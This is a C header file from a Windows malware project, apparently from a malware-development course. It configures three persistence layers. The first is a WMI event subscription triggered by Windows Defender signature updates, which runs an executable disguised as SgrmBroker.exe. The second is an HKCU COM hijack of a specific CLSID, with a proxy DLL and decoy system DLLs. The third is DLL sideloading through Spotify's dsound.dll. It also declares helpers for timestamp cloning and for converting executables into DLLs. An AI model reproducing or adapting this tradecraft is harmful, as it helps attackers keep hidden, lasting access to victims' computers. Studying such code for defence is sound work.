#pragma once
#ifndef HEADERS_H
#define HEADERS_H

#include <Windows.h>
#include <wbemidl.h>
#include <WtsApi32.h>
#include <sddl.h>
#include <DebugMacros.h>

#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "Wbemuuid.lib")
#pragma comment(lib, "advapi32.lib")

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
//                                                  TUNABLE CONSTANTS
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

// ==============================================================
// LAYER 1 - WMI PERSISTENCE
// Monitors a registry value change to trigger execution of our
// dropped executable via a WMI event subscription.
// ==============================================================
#define WMI_OBJECT_PREFIX           L"MaldevAcademy"
#define WMI_TRIGGER_DELAY           30                                          // Seconds to wait before firing after the event is triggered
#define WMI_TRIGGER_REG_HIVE        L"HKEY_LOCAL_MACHINE"
#define WMI_TRIGGER_REG_KEY         L"SOFTWARE\\Microsoft\\Windows Defender\\Signature Updates"
#define WMI_TRIGGER_REG_VALUE       L"SignatureUpdateLastAttempted"             // Timestamp that will change when windows defender does a signature update
#define WMI_EXE_INSTALLATION_DIR    L"%SystemRoot%\\System32\\wbem"             // Directory created to host our persisting executable
#define WMI_EXE_INSTALLATION_NAME   L"SgrmBroker.exe"

// ==============================================================
// LAYER 2 - COM HIJACK
// Hijacks a COM object by creating a matching CLSID key under HKCU.
// HKCU is checked before HKLM, so our DLL gets loaded instead of the real one.
//
// The real HKLM registration (used to identify the system DLL to forward calls to) is:
// C:\Windows\System32\Windows.StateRepositoryPS.dll
// 
// Fetched by calling:
// (Get-Item 'HKLM:\Software\Classes\CLSID\{c53e07ec-25f3-4093-aa39-fc67ea22e99d}\InProcServer32').GetValue('')
//
// The hijacked key we create under HKCU is:
// HKCU\Software\Classes\CLSID\{c53e07ec-25f3-4093-aa39-fc67ea22e99d}\InProcServer32
// ==============================================================
#define COM_HIJACK_KEY              L"Software\\Classes\\CLSID\\{c53e07ec-25f3-4093-aa39-fc67ea22e99d}\\InProcServer32"
#define COM_THREADING_MODEL         L"ThreadingModel"
#define COM_THREADING_VALUE         L"Both"
#define COM_DLL_DIR                 L"%APPDATA%\\Microsoft\\Common"             // Directory created to host our COM DLL
#define COM_PAYLOAD_DLL_NAME        L"MsComHost.dll"                            // Our DLL. this is what the hijacked COM object will load
#define COM_FORWARD_DLL_NAME        L"Common.StateRepositoryRM.dll"             // Renamed copy of the original system DLL (Windows.StateRepositoryPS.dll), used to forward exported function calls
#define COM_SYSTEM_DLL_NAME         L"Windows.StateRepositoryPS.dll"            // The original system DLL under System32 that we copy and rename as Common.StateRepositoryRM.dll

// Real Ms*.dll files copied from System32 next to our payload (MsComHost.dll) to make the directory look legitimate
// Fetched by calling:
// (Get-ChildItem -Path "C:\Windows\System32" -Filter "Ms*.dll")
#define COM_DECOY_DLL_1             L"MsApoFxProxy.dll"
#define COM_DECOY_DLL_2             L"msvfw32.dll"
#define COM_DECOY_DLL_3             L"msfeeds.dll"
#define COM_DECOY_DLL_4             L"msprivs.dll"
#define COM_DECOY_DLL_5             L"msvcrt.dll"
#define COM_DECOY_DLL_6             L"MSVidCtl.dll"

#define COM_DECOY_DLLS_COUNT        6
#define GET_DLL(N)                  COM_DECOY_DLL_##N                           // Resolves to COM_DECOY_DLL_N at compile time
#define DLL_ENTRY(N)                GET_DLL(N)


// ==============================================================
// LAYER 3 - DLL SIDELOADING
// Spotify loads dsound.dll from its own directory before System32.
// We place our DLL as dsound.dll, and drop the real dsound.dll
// (renamed to dspatial.dll) alongside it to forward function calls.
// ==============================================================
#define SIDELOAD_PAYLOAD_DLL        L"dsound.dll"                               // Our payload DLL name — matches what Spotify loads
#define SIDELOAD_FORWARD_DLL        L"dspatial.dll"                             // Renamed original dsound.dll from System32, used to forward exports
#define SIDELOAD_APP_DIR            L"%APPDATA%\\Spotify"                       // Spotify's directory — vulnerable to local DLL sideloading


// ==============================================================
// PAYLOAD CONFIGURATION
// Registry key written during initial execution to signal the persisting WMI executable
// that the 2nd and 3rd persistence layers are already deployed,
// preventing redundant re-patching to dlls and re-installation.
// ==============================================================
#define CONFIG_REG_KEY              L"Software\\" WMI_OBJECT_PREFIX L"\\XXXX"
#define CONFIG_REG_VALUE_NAME       L"AppIdentifier"
#define CONFIG_REG_VALUE_DATA       0x4C4C554E

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
//                                                  GENERAL CONSTANTS
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define BUFFER_SIZE_16					16
#define BUFFER_SIZE_32					32
#define BUFFER_SIZE_64					64
#define BUFFER_SIZE_128					128
#define BUFFER_SIZE_256					256
#define BUFFER_SIZE_512					512
#define BUFFER_SIZE_1024				1024
#define BUFFER_SIZE_2048				2048
#define BUFFER_SIZE_4096				4096     
#define BUFFER_SIZE_8192				8192

#define FNV_OFFSET_BASIS                14695981039346656037ULL
#define FNV_PRIME                       1099511628211ULL
#define FNV_MUL_HH                      0x9E3779B97F4A7C15ULL
#define FNV_MUL_MM                      0x6C62272E07BB0142ULL
#define FNV_MUL_SS                      0xBF58476D1CE4E5B9ULL

#define MUTEX_NAME_FMT                  "Global\\%016I64X"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
//                                              DATA DEFINITIONS
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

typedef struct _EXPORT_ENTRY 
{
    LPCSTR      pszName;        // Export Function Name. If Set to NULL, Function is Exported vua Ordinal Only 
    ULONG_PTR   uFuncAddress;   // RVA of Function. If Set to NULL, The Function is Forwarded
    WORD        wOrdinal;       // Ordinal Value. The Value 'INVALID_ORDINAL' Marks End Of Table
    LPCSTR      pszForward;     // Forward String (e.g. "NTDLL.RtlAllocateHeap", "NTDLL.#1053"). If Set to NULL, Function is Exported By Name (pszName) or Ordinal (wOrdinal).
} EXPORT_ENTRY, *PEXPORT_ENTRY;

#define EDATA_SECTION_NAME      ".edata"
#define INVALID_ORDINAL         (WORD)(0xFFFFF)
#define ALIGN_UP(x, align)      (((x) + (align) - 1) & ~((align) - 1))

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
//                                              UTILITIES FUNCTIONS
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==


typedef enum _STRING_ENCODING
{
    ENCODING_ANSI_TO_WIDE,
    ENCODING_WIDE_TO_ANSI,
    ENCODING_UTF8_TO_WIDE,
    ENCODING_WIDE_TO_UTF8,
    ENCODING_ANSI_TO_UTF8,
    ENCODING_UTF8_TO_ANSI

} STRING_ENCODING;


#ifdef __cplusplus
extern "C" {
#endif

    LPVOID ConvertString(IN LPVOID pvSrc, IN INT cbSrc, IN STRING_ENCODING Encoding);

    BOOL ReadFileFromDiskW(IN LPCWSTR szFileName, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize);

    BOOL WriteFileToDiskW(IN LPCWSTR pszFileName, IN CONST BYTE* pbDataBuffer, IN DWORD dwDataLength);

    BOOL CloneFileTimestampsW(IN LPCWSTR pwszSrcPath, IN LPCWSTR pwszDstPath);

    BOOL SetRegistryStringW(IN HKEY hRoot, IN LPCWSTR pwszPath, IN LPCWSTR pwszName, IN LPCWSTR pwszValue, IN BOOL bOverwrite);

    BOOL SetRegistryDwordW(IN HKEY hRoot, IN LPCWSTR pwszPath, IN LPCWSTR pwszName, IN DWORD dwValue, IN BOOL bOverwrite);

    BOOL GetRegistryDwordW(IN HKEY hRoot, IN LPCWSTR pwszPath, IN LPCWSTR pwszName, OUT PDWORD pdwOutput);

    BOOL DeleteRegistryKeyW(IN HKEY hRoot, IN LPCWSTR pwszPath);

    BOOL GetSystem32PathW(IN LPCWSTR pwszFileName, OUT LPWSTR pwszOutPath, IN DWORD dwOutSize);

    BOOL EnsureDirectoryExistsW(IN LPCWSTR pwszPath, IN BOOL bIsFilePath);

    BOOL CopyFileToDirW(IN LPCWSTR pwszDestPath, IN OPTIONAL LPCWSTR pwszDestName, IN OPTIONAL LPCWSTR pwszSrcPath, IN LPCWSTR pwszSrcName, OUT OPTIONAL LPWSTR pwszOutFullPath, IN OPTIONAL DWORD dwOutFullPathSize);

#ifdef __cplusplus
}
#endif

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
//                                              PERSISTENCE FUNCTIONS
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==


#ifdef __cplusplus
extern "C" {
#endif

    BOOL ConvertExecutableToDll(IN LPCSTR pszOriginalDllPath, IN LPCSTR pszCopiedDllName, IN ULONG_PTR uDllMain, OUT PBYTE* ppDllBuffer, OUT DWORD* pdwDllFileSize);

    BOOL VerifyOrCreateRegistryFlag(IN HKEY hRoot, IN LPCWSTR pwszPath, IN LPCWSTR pwszName, IN DWORD dwExpectedValue, OUT OPTIONAL BOOL* pbAlreadyExisted);

    BOOL AcquirePayloadMutex(OUT HANDLE* phMutex);

    VOID ReleasePayloadMutex(IN HANDLE hMutex);

    BOOL DropExecutableForWmi();

    BOOL InstallComHijack(IN BYTE* pDllFileBuffer, IN DWORD dwDllFileSize);

    BOOL DropSideloadDlls(IN BYTE* pDllFileBuffer, IN DWORD dwDllFileSize);

#ifdef __cplusplus
}
#endif

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
//                                                  MACROS
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#ifdef __cplusplus

#define HEAP_ALLOC(ptr, size)                                                           \
    do {                                                                                \
        (ptr) = (decltype(ptr))HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (size));   \
        if (!(ptr)) DBG_LAST_ERROR("HeapAlloc");                                        \
    } while (0)

#define HEAP_REALLOC(ptr, size)                                                                 \
    do {                                                                                        \
        LPVOID _pTmp = HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (LPVOID)(ptr), (size));  \
        if (!_pTmp) {  DBG_LAST_ERROR("HeapReAlloc"); }                                         \
        else { (ptr) = (decltype(ptr))_pTmp; }                                                  \
    } while (0)


#else //!__cplusplus

#define HEAP_ALLOC(ptr, size)                                                           \
    do {                                                                                \
        (ptr) = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (size));                  \
        if (!(ptr)) DBG_LAST_ERROR("HeapAlloc");                                        \
    } while (0)

#define HEAP_REALLOC(ptr, size)                                                                 \
    do {                                                                                        \
        LPVOID _pTmp = HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (LPVOID)(ptr), (size));  \
        if (!_pTmp) {  DBG_LAST_ERROR("HeapReAlloc"); }                                         \
        else { (ptr) = _pTmp; }                                                                 \
    } while (0)

#endif // __cplusplus


#define BSTR_LITERAL(s) (BSTR)(s)

#define SAFE_FREE_BSTR(bstr)                \
    if (bstr)                               \
    {                                       \
        SysFreeString((BSTR)(bstr));        \
        bstr = NULL;                        \
    }

#define HEAP_FREE(ptr)                                                                  \
    do {                                                                                \
        if (ptr) {                                                                      \
            HeapFree(GetProcessHeap(), 0, (LPVOID)(ptr));                               \
            (ptr) = 0x00;                                                               \
        }                                                                               \
    } while (0)

#define HEAP_SECURE_FREE(ptr, size)                                                     \
    do {                                                                                \
        if (ptr) {                                                                      \
            SecureZeroMemory((PVOID)(ptr), (size));                                     \
            HeapFree(GetProcessHeap(), 0, (LPVOID)(ptr));                               \
            (ptr) = 0x00;                                                               \
        }                                                                               \
    } while (0)

#define CLOSE_HANDLE(handle)                                                            \
    do {                                                                                \
        if ((handle) && (handle) != INVALID_HANDLE_VALUE) {                             \
            CloseHandle((handle));                                                      \
            (handle) = NULL;                                                            \
        }                                                                               \
    } while (0)



#endif // !HEADERS_H

